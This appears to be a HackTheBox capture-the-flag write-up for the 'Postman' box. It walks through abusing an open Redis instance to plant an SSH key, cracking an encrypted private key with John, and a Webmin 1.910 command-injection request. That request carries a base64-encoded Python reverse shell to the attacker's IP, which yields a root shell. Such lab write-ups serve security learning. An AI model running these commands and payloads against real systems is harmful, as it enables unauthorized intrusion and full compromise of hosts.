## nmap
```
root@kali:~/Pentesting/HackTheBox/Boxes/Postman# nmap -sC -sV -oA postman 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 17:13 EST
Nmap scan report for 10.10.10.160
Host is up (0.046s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.89 seconds
```

Initial nmap didn't yield the open redis port, which was important!  Send me down a few dead end paths before running the following more comprehensive nmap:

```
root@kali:~/Pentesting/HackTheBox/Boxes/Postman# nmap -p- 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 17:16 EST
Nmap scan report for 10.10.10.160
Host is up (0.046s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt
```

## ssh crackit on redis server

I used the ssh-crackit technique in the article below to manually create ssh keys and put them in the database on the host through the redis interface.  This then allowed me to ssh into the box as the redis user, getting the initial foothold.

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis

Generate ssh key:
```
shotop@kali:~$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/shotop/.ssh/id_rsa): 
/home/shotop/.ssh/id_rsa already exists.
Overwrite (y/n)? y
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/shotop/.ssh/id_rsa.
Your public key has been saved in /home/shotop/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:brHPGljkGVkGueGBnZI+Nbws63kioDK0EOvgVEyCIuQ shotop@kali
The key's randomart image is:
+---[RSA 3072]----+
|o.     =.+o      |
|=. .  + X+       |
|oE+  . =+*       |
|.  o  +o=o       |
| o.    +S        |
|+o.   .+ o       |
|B... ...=        |
|++  . +..+       |
|..   . o..o      |
+----[SHA256]-----+
```
Prep key to be sent to server:
```
shotop@kali:~$ cd /home/shotop/.ssh/
shotop@kali:~/.ssh$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > shotop.txt
shotop@kali:~/.ssh$ cat shotop.txt 



ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCvn9o2oucCDL+Lna5GP/zoQjzgbA8942jEKZ5qkTnTgO1j/8vu+xlK31/Cf2cochBvqhc3dCGjk5qKjLNUCoMVd1uro/2073Y35n8xTFEYc8XMxfj66t2zdK/MJnzeAGeRRc8O/EU1hFOS7E535PWM5PDohJQxH19OhRcyJE707VjFWkgJtlOtEa/rtUWHzmhie5gcq+KYaATQr0JR+meaQptpJF0PXYsoWqxgNaGlJI7U3Ji/9Ol/VRpLJiVQYextAESu5HJ6h9kSsjywVsC52X9CtXxk/10RXUayojlvZiB00lNx4Obw7T9yObFzRCP7TbA+XaGvetohZKgGrOvidjgdS5gI8azpzYkXEJLGKiXxguJGVynnZXFkyO60GzMyDUapKLQ6kQmky+ji5/HlOQQ99UqFksvimfGV9OmlaSicHKEhisK2tpIK/hzG8QePEolIl9nnM2IgnUTxBgX9YI9PxeJNiz+R/G9H1qoPDA2cs/XXu6iizzcFqjoUrgs= shotop@kali
```

```
shotop@kali:~/.ssh$ cat shotop.txt | redis-cli -h 10.10.10.160 -x set crackit
OK
shotop@kali:~/.ssh$ redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /home/redis/.ssh/
(error) ERR Changing directory: Permission denied
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
10.10.10.160:6379> redis-cli -h 10.10.10.160 flushall
(error) ERR unknown command 'redis-cli'
10.10.10.160:6379> 
shotop@kali:~/.ssh$ redis-cli -h 10.10.10.160 flushall
OK
shotop@kali:~/.ssh$ cat shotop.txt | redis-cli -h 10.10.10.160 -x set crackit
OK
shotop@kali:~/.ssh$ redis-cli -h 10.10.10.160 save
OK
shotop@kali:~/.ssh$  ssh -i ~/.ssh/id_rsa redis@10.10.10.160
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Mar 16 06:19:13 2020 from 10.10.14.41
redis@Postman:~$ 

```
## Foothold on the Box

SimpleHttpServer to get linenum onto the box

on kali machine: 
```
shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2020-03-16 11:35:55--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.76.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.76.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                              100%[==============================================================================>]  45.54K  --.-KB/s    in 0.03s   

2020-03-16 11:35:56 (1.29 MB/s) - ‘LinEnum.sh’ saved [46631/46631]


shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ python -m SimpleHTTPServer 2222
Serving HTTP on 0.0.0.0 port 2222 ...

```
On host:

```
redis@Postman:~$ cd /tmp/
redis@Postman:/tmp$ ls
systemd-private-664d7fa2cc444002b3bb7dbbb5467be3-apache2.service-I4KI09
systemd-private-664d7fa2cc444002b3bb7dbbb5467be3-redis-server.service-4ce2WU
systemd-private-664d7fa2cc444002b3bb7dbbb5467be3-systemd-resolved.service-8Ji5q8
systemd-private-664d7fa2cc444002b3bb7dbbb5467be3-systemd-timesyncd.service-Ou0ZyZ
redis@Postman:/tmp$ wget 10.10.14.41:3333/LinEnum.sh
--2020-03-16 18:03:06--  http://10.10.14.41:3333/LinEnum.sh
Connecting to 10.10.14.41:3333... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                              100%[==============================================================================>]  45.54K  --.-KB/s    in 0.08s   

2020-03-16 18:03:06 (575 KB/s) - ‘LinEnum.sh’ saved [46631/46631]

redis@Postman:/tmp$ ls
LinEnum.sh
```

Run LinEnum:
```
redis@Postman:/tmp$ chmod +x LinEnum.sh
redis@Postman:/tmp$ ./LinEnum.sh 
```

There's some interesting information in the output, in particular the location of user Matt's id_rsa backup file:
```
[-] Location and Permissions (if accessible) of .bak file(s):
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-rw------- 1 root root 709 Oct 25 16:38 /var/backups/group.bak
-rw------- 1 root shadow 588 Oct 25 16:38 /var/backups/gshadow.bak
-rw------- 1 root shadow 935 Aug 26  2019 /var/backups/shadow.bak
-rw------- 1 root root 1382 Aug 25  2019 /var/backups/passwd.bak
```

## viewing Matt's id_rsa.bak file
```
redis@Postman:/$ find / -type f -iname "*.bak" 2>/dev/null
```

```
redis@Postman:/$ cat /opt/id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Will now try to crack with John the ripper - need to use ssh2john to prep the key for usage with John:
```
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

```
shotop@kali:~/Pentesting/HackTheBox/Boxes/postman$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:06 DONE (2020-01-20 20:50) 0.1468g/s 2105Kp/s 2105Kc/s 2105KC/sa6_123..*7¡Vamos!
Session completed
```

## Login into Webmin as Matt

The cracked passphrase above is actually a password we can use as username Matt to login to the webmin service running on port 10000.

https://10.10.10.160:10000/sysinfo.cgi?xnavigation=1

He is our user -- now need to figure out how to get a shell as him.  

## RCE in wedmin update packages functionaly.  

Googling quickly yeilds results for webmin 1.910, which is our version.  After logging into the service as Matt, I located the package update area of the app.  I captured a request to update one of the packages in burp and filled it in with content i found in the metasploit module for this version of webmin:

https://www.exploit-db.com/exploits/46984

```
POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Progressive-URL: https://10.10.10.160:10000/package-updates/update.cgi
X-Requested-From: package-updates
X-Requested-From-Tab: webmin
X-Requested-With: XMLHttpRequest
Content-Length: 57
Connection: close
Cookie: redirect=1; testing=1; sid=59481a64855a94b7e8a615aaa1304c12

u=acl%2Fapt&u=%20%7C%20id&ok_top=Update+Selected+Packages
```
I placed "id" in the middle of the body section of the request to see if I had RCE.  I did:

```
<div class="panel-body">
Building complete list of packages ..<p>
Now updating <tt>acl  | id</tt> ..<br>
<ul>
<b>Installing package(s) with command <tt>apt-get -y  install acl  | id</tt> ..</b><p>
<pre>uid&#61;0(root) gid&#61;0(root) groups&#61;0(root)
</pre>
<b>.. install complete.</b><p>
</ul><br>
No packages were installed. Check the messages above for the cause of the error.<p>
```

Now will try to get a reverse shell:

First, confirm we have python on the box
```
redis@Postman:/tmp$ python
Python 2.7.15+ (default, Nov 27 2018, 23:36:35) 
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```
Now that we do, grab reverse shell python code from pentestmonkey:
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

```
shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ cat python_payload.txt 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.41",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now we need to base64 encode the payload:
```
shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ cat python_payload.txt | base64 | tr -d '\r\n' && echo ''
cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNDEiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycK
```
Next we start a listener locally to recieve the call back:
```
shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ nc -lvnp 9001
listening on [any] 9001 ...

```
Now we drop the base-64 encoded payload into the payload position in the post in burp

```
POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Progressive-URL: https://10.10.10.160:10000/package-updates/update.cgi
X-Requested-From: package-updates
X-Requested-From-Tab: webmin
X-Requested-With: XMLHttpRequest
Content-Length: 378
Connection: close
Cookie: redirect=1; testing=1; sid=dc687908de54c074d0b351994a557755

u=acl%2Fapt&u=| echo -n "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuNDEiLDkwMDEpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOycK"|base64 -d|bash;&ok_top=Update+Selected+Packages
```

And if successful, it calls back to our listener - in this case giving us root before we even get the Matt user.  Just navigate a bit to find root's flag:
```
shotop@kali:~/Pentesting/HackTheBox/PublicBoxes/Postman$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.160] 58406
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# pwd
/usr/share/webmin/package-updates/
# cd /home/root
/bin/sh: 3: cd: can't cd to /home/root
# cd /root
# ls
redis-5.0.0
root.txt

```

## privesc to Matt

it took me way too long to try it, but the same password we used to login into Webmin as Matt is his system user password.  Quick detail - his name is capitalized in the /home directory and that matters:

```
redis@Postman:/var/lib$ su Matt
Password: 
Matt@Postman:/var/lib$ cd /home/Matt/
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ cat user.txt 
517ad0ec2458ca97af8d93aac08a2f3c
Matt@Postman:~$ ls
user.txt
Matt@Postman:~$ ls -al
total 52
drwxr-xr-x 6 Matt Matt 4096 Sep 11 11:28 .
drwxr-xr-x 3 root root 4096 Sep 11 11:27 ..
-rw------- 1 Matt Matt 1676 Sep 11 11:46 .bash_history
-rw-r--r-- 1 Matt Matt  220 Aug 25 15:10 .bash_logout
-rw-r--r-- 1 Matt Matt 3771 Aug 25 15:10 .bashrc
drwx------ 2 Matt Matt 4096 Aug 25 18:20 .cache
drwx------ 3 Matt Matt 4096 Aug 25 23:23 .gnupg
drwxrwxr-x 3 Matt Matt 4096 Aug 25 23:29 .local
-rw-r--r-- 1 Matt Matt  807 Aug 25 15:10 .profile
-rw-rw-r-- 1 Matt Matt   66 Aug 26 00:48 .selected_editor
drwx------ 2 Matt Matt 4096 Aug 26 00:04 .ssh
-rw-rw---- 1 Matt Matt   33 Aug 26 03:07 user.txt
-rw-rw-r-- 1 Matt Matt  181 Aug 25 18:22 .wget-hsts
```
